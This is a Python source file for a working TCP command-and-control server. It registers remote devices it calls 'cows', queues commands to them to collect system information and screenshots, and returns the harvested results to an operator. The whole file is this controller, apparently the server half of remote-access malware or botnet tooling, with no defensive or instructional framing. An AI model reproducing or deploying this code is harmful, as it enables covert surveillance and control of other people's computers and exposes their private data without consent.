import socket

# ╔════════════════════════════════════════════════════════════════════╗
# ║ > Server will listen on all interfaces at this port                ║
# ╚════════════════════════════════════════════════════════════════════╝
ip = '0.0.0.0'
port = 4570

# ╔════════════════════════════════════════════════════════════════════╗
# ║ > Store seen device names and IPs                                  ║
# ╚════════════════════════════════════════════════════════════════════╝
DeviceIDList = []
DeviceIPList = []

# ╔════════════════════════════════════════════════════════════════════╗
# ║ > Commands waiting to be sent to a specific device                 ║
# ╚════════════════════════════════════════════════════════════════════╝
pending_command = {}

# ╔════════════════════════════════════════════════════════════════════╗
# ║ > Responses sent back from clients                                 ║
# ║ > Format: { device_name: { command_name: response_str } }          ║
# ╚════════════════════════════════════════════════════════════════════╝
response_buffer = {}

# ╔════════════════════════════════════════════════════════════════════╗
# ║ > Set up and start the TCP server                                  ║
# ╚════════════════════════════════════════════════════════════════════╝
server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
server_socket.bind((ip, port))
server_socket.listen(5)

print(f"[+] Server listening on {ip}:{port}")

while True:
    # ╔════════════════════════════════════════════════════════════════════╗
    # ║ > Accept an incoming client connection                             ║
    # ╚════════════════════════════════════════════════════════════════════╝
    client_socket, address = server_socket.accept()
    msg = client_socket.recv(4096).decode()

    lines = msg.splitlines()  # Split message by lines

    # ╔════════════════════════════════════════════════════════════════════╗
    # ║ > Handle :CLIENTPING Command                                       ║
    # ╚════════════════════════════════════════════════════════════════════╝
    if msg.startswith(":CLIENTPING"):
        name = lines[1]           # Device name
        ip_addr = lines[2]        # IP address of the device
        if name not in DeviceIDList:
            DeviceIDList.append(name)
            DeviceIPList.append(ip_addr)
            print(f"[+] New cow: {name} at {ip_addr}")

        if pending_command.get(name):
            command = pending_command.pop(name)
            client_socket.send(command.encode())
        else:
            client_socket.send(b":NOOP")

    # ╔════════════════════════════════════════════════════════════════════╗
    # ║ > Handle :PCINFO Command                                           ║
    # ╚════════════════════════════════════════════════════════════════════╝
    elif msg.startswith(":PCINFO"):
        name = lines[1]               # Device name
        info = "\n".join(lines[2:])   # Gather device info

        print(f"\n[>] Received PCINFO from {name}.")
        print(info)

        if name not in response_buffer:
            response_buffer[name] = {}
        response_buffer[name]["GETINFO"] = info

    # ╔════════════════════════════════════════════════════════════════════╗
    # ║ > Handle :SCREENSHOT Command                                       ║
    # ╚════════════════════════════════════════════════════════════════════╝
    elif msg.startswith(":SCREENSHOT"):
        name = lines[1]           # Device name
        link = lines[2]           # Screenshot URL

        print(f"\n[>] Received SCREENSHOT from {name}.")
        print(link)

        if name not in response_buffer:
            response_buffer[name] = {}
        response_buffer[name]["GETSCREENSHOT"] = link

    # ╔════════════════════════════════════════════════════════════════════╗
    # ║ > Handle :GETINFO Command                                          ║
    # ╚════════════════════════════════════════════════════════════════════╝
    elif msg.startswith(":GETINFO"):
        target = lines[1]  # Name of the target device
        pending_command[target] = ":COMMAND :GETINFO"
        print(f"[+] Queued :GETINFO for {target}")

    # ╔════════════════════════════════════════════════════════════════════╗
    # ║ > Handle :GETSCREENSHOT Command                                    ║
    # ╚════════════════════════════════════════════════════════════════════╝
    elif msg.startswith(":GETSCREENSHOT"):
        target = lines[1]  # Name of the target device
        pending_command[target] = ":COMMAND :GETSCREENSHOT"
        print(f"[+] Queued :GETSCREENSHOT for {target}")

    # ╔════════════════════════════════════════════════════════════════════╗
    # ║ > Handle :LISTCOWS Command                                         ║
    # ╚════════════════════════════════════════════════════════════════════╝
    elif msg.startswith(":LISTCOWS"):
        print(DeviceIDList)
        cows_list = "\n".join(DeviceIDList)
        client_socket.sendall(cows_list.encode())

    # ╔════════════════════════════════════════════════════════════════════╗
    # ║ > Handle :FETCHRESPONSE Command                                    ║
    # ╚════════════════════════════════════════════════════════════════════╝
    elif msg.startswith(":FETCHRESPONSE"):
        target = lines[1]
        command = lines[2]

        if target in response_buffer and command in response_buffer[target]:
            client_socket.sendall(response_buffer[target][command].encode())
            del response_buffer[target][command]
        else:
            client_socket.send(b"No response available yet.\n")

    # ╔════════════════════════════════════════════════════════════════════╗
    # ║ > Close client connection                                          ║
    # ╚════════════════════════════════════════════════════════════════════╝
    client_socket.close()
